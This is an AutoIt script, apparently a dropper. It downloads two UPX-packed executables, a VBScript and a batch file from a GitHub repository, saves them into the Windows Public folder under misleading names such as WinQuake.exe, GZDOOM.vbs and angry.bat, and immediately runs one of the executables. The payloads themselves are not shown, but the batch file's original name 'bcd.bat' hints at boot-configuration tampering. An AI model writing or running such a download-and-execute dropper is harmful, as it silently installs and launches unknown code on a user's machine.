#include <InetConstants.au3>
InetGet("https://github.com/lz-fkn/dvdlogo/releases/download/p1/WinQuake.upx.exe","C:\Users\Public\WinQuake.exe", $INET_FORCERELOAD, $INET_DOWNLOADWAIT)
InetGet("https://github.com/lz-fkn/dvdlogo/raw/main/prevent.vbs","C:\Users\Public\GZDOOM.vbs", $INET_FORCERELOAD, $INET_DOWNLOADWAIT)
InetGet("https://github.com/lz-fkn/dvdlogo/raw/main/bcd.bat","C:\Users\Public\angry.bat", $INET_FORCERELOAD, $INET_DOWNLOADWAIT)
InetGet("https://github.com/lz-fkn/dvdlogo/releases/download/u/dvdfhd.upx.exe","C:\Users\Public\div.exe", $INET_FORCERELOAD, $INET_DOWNLOADWAIT)
Run("C:\Users\Public\WinQuake.exe")